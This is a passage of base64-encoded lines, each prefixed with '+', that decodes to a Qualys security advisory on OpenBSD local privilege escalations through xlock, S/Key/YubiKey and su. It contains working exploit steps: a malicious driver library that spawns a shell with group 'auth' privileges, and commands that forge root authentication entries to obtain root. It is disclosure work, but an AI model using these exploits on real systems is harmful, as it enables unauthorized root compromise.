+ICAgaWYgKGdldGV1aWQoKSA9PSBnZXR1aWQoKSkgew0KMTE0ICAgICAgIC8q
+IGRvbid0IGFsbG93IHNldHVpZCBhcHBzIHRvIHVzZSBMSUJHTF9EUklWRVJT
+X1BBVEggKi8NCjExNSAgICAgICBsaWJQYXRocyA9IGdldGVudigiTElCR0xf
+RFJJVkVSU19QQVRIIik7DQotLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0t
+LS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0t
+LS0tLS0NCg0KQSBsb2NhbCBhdHRhY2tlciBjYW4gZXhwbG9pdCB0aGlzIHZ1
+bG5lcmFiaWxpdHkgYW5kIGRsb3BlbigpIHRoZWlyIG93bg0KZHJpdmVyIHRv
+IG9idGFpbiB0aGUgcHJpdmlsZWdlcyBvZiB0aGUgZ3JvdXAgImF1dGgiOg0K
+DQotLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0t
+LS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0NCiQgaWQNCnVp
+ZD0zMjc2Nyhub2JvZHkpIGdpZD0zMjc2Nyhub2JvZHkpIGdyb3Vwcz0zMjc2
+Nyhub2JvZHkpDQoNCiQgY2QgL3RtcA0KDQokIGNhdCA+IHN3cmFzdF9kcmku
+YyA8PCAiRU9GIg0KI2luY2x1ZGUgPHBhdGhzLmg+DQojaW5jbHVkZSA8c3lz
+L3R5cGVzLmg+DQojaW5jbHVkZSA8dW5pc3RkLmg+DQoNCnN0YXRpYyB2b2lk
+IF9fYXR0cmlidXRlX18gKChjb25zdHJ1Y3RvcikpIF9pbml0ICh2b2lkKSB7
+DQogICAgZ2lkX3QgcmdpZCwgZWdpZCwgc2dpZDsNCiAgICBpZiAoZ2V0cmVz
+Z2lkKCZyZ2lkLCAmZWdpZCwgJnNnaWQpICE9IDApIF9leGl0KF9fTElORV9f
+KTsNCiAgICBpZiAoc2V0cmVzZ2lkKHNnaWQsIHNnaWQsIHNnaWQpICE9IDAp
+IF9leGl0KF9fTElORV9fKTsNCg0KICAgIGNoYXIgKiBjb25zdCBhcmd2W10g
+PSB7IF9QQVRIX0tTSEVMTCwgTlVMTCB9Ow0KICAgIGV4ZWN2ZShhcmd2WzBd
+LCBhcmd2LCBOVUxMKTsNCiAgICBfZXhpdChfX0xJTkVfXyk7DQp9DQpFT0YN
+Cg0KJCBnY2MgLWZwaWMgLXNoYXJlZCAtcyAtbyBzd3Jhc3RfZHJpLnNvIHN3
+cmFzdF9kcmkuYw0KDQokIGVudiAtaSAvdXNyL1gxMVI2L2Jpbi9YdmZiIDo2
+NiAtY2MgMCAmDQpbMV0gMjcwNg0KDQokIGVudiAtaSBMSUJHTF9EUklWRVJT
+X1BBVEg9LiAvdXNyL1gxMVI2L2Jpbi94bG9jayAtZGlzcGxheSA6NjYNCg0K
+JCBpZA0KdWlkPTMyNzY3KG5vYm9keSkgZ2lkPTExKGF1dGgpIGdyb3Vwcz0z
+Mjc2Nyhub2JvZHkpDQotLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0t
+LS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0t
+LS0NCg0KDQo9PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09
+PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT0NCjMu
+IENWRS0yMDE5LTE5NTIyOiBMb2NhbCBwcml2aWxlZ2UgZXNjYWxhdGlvbiB2
+aWEgUy9LZXkgYW5kIFl1YmlLZXkNCj09PT09PT09PT09PT09PT09PT09PT09
+PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09
+PT09PT09PT09PQ0KDQpJZiB0aGUgUy9LZXkgb3IgWXViaUtleSBhdXRoZW50
+aWNhdGlvbiB0eXBlIGlzIGVuYWJsZWQgKHRoZXkgYXJlIGJvdGgNCmluc3Rh
+bGxlZCBieSBkZWZhdWx0IGJ1dCBkaXNhYmxlZCksIHRoZW4gYSBsb2NhbCBh
+dHRhY2tlciBjYW4gZXhwbG9pdA0KdGhlIHByaXZpbGVnZXMgb2YgdGhlIGdy
+b3VwICJhdXRoIiB0byBvYnRhaW4gdGhlIGZ1bGwgcHJpdmlsZWdlcyBvZiB0
+aGUNCnVzZXIgInJvb3QiIChiZWNhdXNlIGxvZ2luX3NrZXkgYW5kIGxvZ2lu
+X3l1YmlrZXkgZG8gbm90IHZlcmlmeSB0aGF0IHRoZQ0KZmlsZXMgaW4gL2V0
+Yy9za2V5IGFuZCAvdmFyL2RiL3l1YmlrZXkgYmVsb25nIHRvIHRoZSBjb3Jy
+ZWN0IHVzZXIsIGFuZA0KdGhlc2UgZGlyZWN0b3JpZXMgYXJlIGJvdGggd3Jp
+dGFibGUgYnkgdGhlIGdyb3VwICJhdXRoIikuDQoNCihOb3RlOiB0byBvYnRh
+aW4gdGhlIHByaXZpbGVnZXMgb2YgdGhlIGdyb3VwICJhdXRoIiwgYSBsb2Nh
+bCBhdHRhY2tlcg0KY2FuIGZpcnN0IGV4cGxvaXQgQ1ZFLTIwMTktMTk1MjAg
+aW4geGxvY2suKQ0KDQpJZiBTL0tleSBpcyBlbmFibGVkICh2aWEgc2tleWlu
+aXQgLUUpLCBhIGxvY2FsIGF0dGFja2VyIHdpdGggImF1dGgiDQpwcml2aWxl
+Z2VzIGNhbiBhZGQgYW4gUy9LZXkgZW50cnkgKGEgZmlsZSBpbiAvZXRjL3Nr
+ZXkpIGZvciB0aGUgdXNlcg0KInJvb3QiIChpZiB0aGlzIGZpbGUgYWxyZWFk
+eSBleGlzdHMsIHRoZSBhdHRhY2tlciBjYW5ub3Qgc2ltcGx5IHJlbW92ZQ0K
+b3IgcmVuYW1lIGl0LCBiZWNhdXNlIC9ldGMvc2tleSBpcyBzdGlja3k7IGEg
+c2ltcGxlIHdvcmthcm91bmQgZXhpc3RzLA0KYW5kIGlzIGxlZnQgYXMgYW4g
+ZXhlcmNpc2UgZm9yIHRoZSBpbnRlcmVzdGVkIHJlYWRlcik6DQoNCi0tLS0t
+LS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0t
+LS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQ0KJCBpZA0KdWlkPTMyNzY3
+KG5vYm9keSkgZ2lkPTExKGF1dGgpIGdyb3Vwcz0zMjc2Nyhub2JvZHkpDQoN
+CiQgZWNobyAncm9vdCBtZDUgMDEwMCBvYnNkOTEzMzUgOGI2ZDk2ZTBlZjFi
+MWMyMScgPiAvZXRjL3NrZXkvcm9vdA0KDQokIGNobW9kIDA2MDAgL2V0Yy9z
+a2V5L3Jvb3QNCg0KJCBlbnYgLWkgVEVSTT12dDIyMCBzdSAtbCAtYSBza2V5
+DQpvdHAtbWQ1IDk5IG9ic2Q5MTMzNQ0KUy9LZXkgUGFzc3dvcmQ6IEVHRyBM
+QVJEIEdST1cgSE9HIERSQUcgTEFJTg0KDQojIGlkDQp1aWQ9MChyb290KSBn
+aWQ9MCh3aGVlbCkgLi4uDQotLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0t
+LS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0t
+LS0tLS0NCg0KSWYgWXViaUtleSBpcyBlbmFibGVkICh2aWEgbG9naW4uY29u
+ZiksIGEgbG9jYWwgYXR0YWNrZXIgd2l0aCAiYXV0aCINCnByaXZpbGVnZXMg
+Y2FuIGFkZCBhIFl1YmlLZXkgZW50cnkgKHR3byBmaWxlcyBpbiAvdmFyL2Ri
+L3l1YmlrZXkpIGZvcg0KdGhlIHVzZXIgInJvb3QiIChpZiB0aGVzZSBmaWxl
+cyBhbHJlYWR5IGV4aXN0LCB0aGUgYXR0YWNrZXIgY2FuIHNpbXBseQ0KcmVt
+b3ZlIG9yIHJlbmFtZSB0aGVtLCBiZWNhdXNlIC92YXIvZGIveXViaWtleSBp
+cyBub3Qgc3RpY2t5KToNCg0KLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0t
+LS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0t
+LS0tLS0tDQokIGlkDQp1aWQ9MzI3Njcobm9ib2R5KSBnaWQ9MTEoYXV0aCkg
+Z3JvdXBzPTMyNzY3KG5vYm9keSkNCg0KJCBlY2hvIDMyZDMyZGRmYjdkNSA+
+IC92YXIvZGIveXViaWtleS9yb290LnVpZA0KDQokIGVjaG8gNTU0ZDVlZWRm
+ZDc1ZmI5NmNjNzRkNTI2MDk1MDUyMTYgPiAvdmFyL2RiL3l1YmlrZXkvcm9v
+dC5rZXkNCg0KJCBlbnYgLWkgVEVSTT12dDIyMCBzdSAtbCAtYSB5dWJpa2V5
+DQpQYXNzd29yZDoga3JraGd0dWhkbmpjbHJpa2lra2x1bGtsZGx1dHJldWwN
+Cg0KIyBpZA0KdWlkPTAocm9vdCkgZ2lkPTAod2hlZWwpIC4uLg0KLS0tLS0t
+LS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0t
+LS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tDQoNCg0KPT09PT09PT09PT09
+PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09
+PT09PT09PT09PT09PT09PT09PT09DQo0LiBDVkUtMjAxOS0xOTUxOTogTG9j
+YWwgcHJpdmlsZWdlIGVzY2FsYXRpb24gdmlhIHN1DQo9PT09PT09PT09PT09
+PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09
+PT09PT09PT09PT09PT09PT09PT0NCg0KQSBsb2NhbCBhdHRhY2tlciBjYW4g
+ZXhwbG9pdCBzdSdzIC1MIG9wdGlvbiAoIkxvb3AgdW50aWwgYSBjb3JyZWN0
+DQp1c2VybmFtZSBhbmQgcGFzc3dvcmQgY29tYmluYXRpb24gaXMgZW50ZXJl
+ZCIpIHRvIGxvZyBpbiBhcyB0aGVtc2VsdmVzDQpidXQgd2l0aCBhbm90aGVy
+IHVzZXIncyBsb2dpbiBjbGFzcyAod2l0aCB0aGUgZXhjZXB0aW9uIG9mIHJv
+b3QncyBsb2dpbg0KY2xhc3MgaWYgdGhlIGF0dGFja2VyIGlzIG5vdCBpbiB0
+aGUgZ3JvdXAgIndoZWVsIiksIGJlY2F1c2UgdGhlIGNsYXNzDQp2YXJpYWJs
+ZSBpcyBzZXQgb25jZSBhbmQgbmV2ZXIgcmVzZXQ6DQoNCi0tLS0tLS0tLS0t
+LS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0t
+LS0tLS0tLS0tLS0tLS0tLS0tLS0tLQ0KIDYwIGludA0KIDYxIG1haW4oaW50
+IGFyZ2MsIGNoYXIgKiphcmd2KQ0KIDYyIHsNCi4uLg0KMTc0ICAgICAgICAg
+Zm9yICg7Oykgew0KLi4uDQoyMTAgICAgICAgICAgICAgICAgIGlmICghY2xh
+c3MgJiYgcHdkICYmIHB3ZC0+cHdfY2xhc3MgJiYgcHdkLT5wd19jbGFzc1sw
+XSAhPSAnXDAnKQ0KMjExICAgICAgICAgICAgICAgICAgICAgICAgIGNsYXNz
+ID0gc3RyZHVwKHB3ZC0+cHdfY2xhc3MpOw0KLS0tLS0tLS0tLS0tLS0tLS0t
+LS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0t
+LS0tLS0tLS0tLS0tLS0tDQoNCkluIHRoZSBmb2xsb3dpbmcgZXhhbXBsZSwg
+SmFuZSAod2hvIGlzIGEgbWVtYmVyIG9mIHRoZSBncm91cCAid2hlZWwiKQ0K
+bG9ncyBpbiB3aXRoIHJvb3QncyBsb2dpbiBjbGFzcyAoImRhZW1vbiIpLCB0
+aGVyZWJ5IGluY3JlYXNpbmcgaGVyDQpyZXNvdXJjZSBsaW1pdHM6DQoNCi0t
+LS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0t
+LS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQ0KJCBpZA0KdWlkPTEw
+MDAoamFuZSkgZ2lkPTEwMDAoamFuZSkgZ3JvdXBzPTEwMDAoamFuZSksIDAo
+d2hlZWwpDQoNCiQgdWxpbWl0IC1IIC1hDQouLi4NCnByb2Nlc3NlcyAgICAg
+ICAgICAgIDUxMg0KDQokIHN1IC1sIC1MDQpsb2dpbjogcm9vdA0KUGFzc3dv
+cmQ6DQpMb2dpbiBpbmNvcnJlY3QNCmxvZ2luOiBqYW5lDQpQYXNzd29yZDoN
+Cg0KJCBpZA0KdWlkPTEwMDAoamFuZSkgZ2lkPTEwMDAoamFuZSkgZ3JvdXBz
+PTEwMDAoamFuZSksIDAod2hlZWwpDQoNCiQgdWxpbWl0IC1IIC1hDQouLi4N
+CnByb2Nlc3NlcyAgICAgICAgICAgIDEzMTANCi0tLS0tLS0tLS0tLS0tLS0t
+LS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0t
+LS0tLS0tLS0tLS0tLS0tLQ0KDQpJbiB0aGUgZm9sbG93aW5nIGV4YW1wbGUs
+IEpvaG4gKHdobyBpcyBub3QgYSBtZW1iZXIgb2YgdGhlIGdyb3VwDQoid2hl
+ZWwiKSBsb2dzIGluIHdpdGggX3BidWlsZCdzIGxvZ2luIGNsYXNzICgicGJ1
+aWxkIiksIHRoZXJlYnkNCmluY3JlYXNpbmcgaGlzIHJlc291cmNlIGxpbWl0
+czoNCg0KLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0t
+LS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tDQokIGlk
+DQp1aWQ9MTAwMShqb2huKSBnaWQ9MTAwMShqb2huKSBncm91cHM9MTAwMShq
+b2huKQ0KDQokIHVsaW1pdCAtSCAtYQ0KLi4uDQpkYXRhKGtieXRlcykgICAg
+ICAgICA3ODY0MzINCi4uLg0KcHJvY2Vzc2VzICAgICAgICAgICAgMjU2DQoN
+CiQgc3UgLWwgLUwNCmxvZ2luOiBfcGJ1aWxkDQpQYXNzd29yZDoNCkxvZ2lu
+IGluY29ycmVjdA0KbG9naW46IGpvaG4NClBhc3N3b3JkOg0KDQokIGlkDQp1
+aWQ9MTAwMShqb2huKSBnaWQ9MTAwMShqb2huKSBncm91cHM9MTAwMShqb2hu
+KQ0KDQokIHVsaW1pdCAtSCAtYQ0KLi4uDQpkYXRhKGtieXRlcykgICAgICAg
+ICAzMzU1NDQzMg0KLi4uDQpwcm9jZXNzZXMgICAgICAgICAgICAxMDI0DQot
+LS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0t
+LS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0NCg0KDQo9PT09PT09
+PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09
+PT09PT09PT09PT09PT09PT09PT09PT09PT0NCjUuIEFja25vd2xlZGdtZW50
+cw0KPT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09
+PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09DQoNCldlIHRo
+YW5rIFRoZW8gZGUgUmFhZHQgYW5kIHRoZSBPcGVuQlNEIGRldmVsb3BlcnMg
+Zm9yIHRoZWlyIGluY3JlZGlibHkNCnF1aWNrIHJlc3BvbnNlOiB0aGV5IHB1
+Ymxpc2hlZCBwYXRjaGVzIGZvciB0aGVzZSB2dWxuZXJhYmlsaXRpZXMgbGVz
+cw0KdGhhbiA0MCBob3VycyBhZnRlciBvdXIgaW5pdGlhbCBjb250YWN0LiBX
+ZSBhbHNvIHRoYW5rIE1JVFJFJ3MgQ1ZFDQpBc3NpZ25tZW50IFRlYW0uDQoN
+Cg0KDQpbaHR0cHM6Ly9kMWRlamFqNmRjcXYyNC5jbG91ZGZyb250Lm5ldC9h
+c3NldC9pbWFnZS9lbWFpbC1iYW5uZXItMzg0LTJ4LnBuZ108aHR0cHM6Ly93
+d3cucXVhbHlzLmNvbS9lbWFpbC1iYW5uZXI+DQoNCg0KDQpUaGlzIG1lc3Nh
+Z2UgbWF5IGNvbnRhaW4gY29uZmlkZW50aWFsIGFuZCBwcml2aWxlZ2VkIGlu
+Zm9ybWF0aW9uLiBJZiBpdCBoYXMgYmVlbiBzZW50IHRvIHlvdSBpbiBlcnJv
+ciwgcGxlYXNlIHJlcGx5IHRvIGFkdmlzZSB0aGUgc2VuZGVyIG9mIHRoZSBl
+cnJvciBhbmQgdGhlbiBpbW1lZGlhdGVseSBkZWxldGUgaXQuIElmIHlvdSBh
+cmUgbm90IHRoZSBpbnRlbmRlZCByZWNpcGllbnQsIGRvIG5vdCByZWFkLCBj
+b3B5LCBkaXNjbG9zZSBvciBvdGhlcndpc2UgdXNlIHRoaXMgbWVzc2FnZS4g
+VGhlIHNlbmRlciBkaXNjbGFpbXMgYW55IGxpYWJpbGl0eSBmb3Igc3VjaCB1
+bmF1dGhvcml6ZWQgdXNlLiBOT1RFIHRoYXQgYWxsIGluY29taW5nIGVtYWls
+cyBzZW50IHRvIFF1YWx5cyBlbWFpbCBhY2NvdW50cyB3aWxsIGJlIGFyY2hp
+dmVkIGFuZCBtYXkgYmUgc2Nhbm5lZCBieSB1cyBhbmQvb3IgYnkgZXh0ZXJu
+YWwgc2VydmljZSBwcm92aWRlcnMgdG8gZGV0ZWN0IGFuZCBwcmV2ZW50IHRo
+cmVhdHMgdG8gb3VyIHN5c3RlbXMsIGludmVzdGlnYXRlIGlsbGVnYWwgb3Ig
+aW5hcHByb3ByaWF0ZSBiZWhhdmlvciwgYW5kL29yIGVsaW1pbmF0ZSB1bnNv
+bGljaXRlZCBwcm9tb3Rpb25hbCBlbWFpbHMgKOKAnHNwYW3igJ0pLiBJZiB5
+b3UgaGF2ZSBhbnkgY29uY2VybnMgYWJvdXQgdGhpcyBwcm9jZXNzLCBwbGVh
+c2UgY29udGFjdCB1cy4NCg==
